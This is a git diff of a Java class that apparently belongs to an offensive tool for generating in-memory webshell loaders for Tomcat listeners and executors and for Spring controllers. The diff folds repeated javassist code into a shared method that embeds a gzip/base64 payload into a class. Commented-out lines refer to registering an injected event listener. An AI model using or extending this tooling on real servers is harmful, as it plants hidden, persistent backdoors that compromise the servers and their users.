@@ -14,19 +14,13 @@ import javassist.CtClass;
  */
 @Builder(Builder.Loader)
 public class MSLoaderBuilder {
+    /**
+     * Tomcat
+     */
     @Middleware(Middleware.Tomcat)
     @MemShell(MemShell.Listener)
     public byte[] listener(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
-        ClassPool classPool = ClassPool.getDefault();
-        classPool.insertClassPath(new ClassClassPath(cls));
-//        classPool.importPackage("javax.servlet.http");
-        classPool.importPackage("java.util");
-        classPool.importPackage("java.lang.reflect");
-
-        CtClass ctClass = classPool.getCtClass(cls.getName());
-
-        JavaClassUtils.fieldChangeIfExist(ctClass, "gzipObject", String.format("private static String gzipObject = \"%s\";", MSGzipBase64));
-
+        return defaultLoader(cls, MSGzipBase64, javaClassHelper);
         // 目前来看这样这样似乎不好维护 javassist 语法问题还是蛮多的
 //        CtMethod isInjectCtMethod = ctClass.getDeclaredMethod("isInject");
 //        isInjectCtMethod.setBody("{try {\n" +
@@ -68,13 +62,29 @@ public class MSLoaderBuilder {
 //                "    invokeMethod($1, \"addApplicationEventListener\", new Class[]{Object.class}, new Object[]{$2});\n" +
 //                "}\n" +
 //                "flag = new Boolean(true);}");
-
-        return JavaClassModifier.ctClassBuilder(ctClass, javaClassHelper, null);
     }
 
     @Middleware(Middleware.Tomcat)
     @MemShell(MemShell.Executor)
     public byte[] executor(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
+        return defaultLoader(cls, MSGzipBase64, javaClassHelper);
+    }
+
+
+    /**
+     * Spring
+     */
+    @Middleware(Middleware.Spring)
+    @MemShell(MemShell.Controller)
+    public byte[] controller(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
+        return defaultLoader(cls, MSGzipBase64, javaClassHelper);
+    }
+
+
+    /**
+     * 直接加载
+     */
+    public static byte[] defaultLoader(Class cls, String MSGzipBase64, JavaClassHelper javaClassHelper) throws Exception {
         ClassPool classPool = ClassPool.getDefault();
         classPool.insertClassPath(new ClassClassPath(cls));
 //        classPool.importPackage("javax.servlet.http");
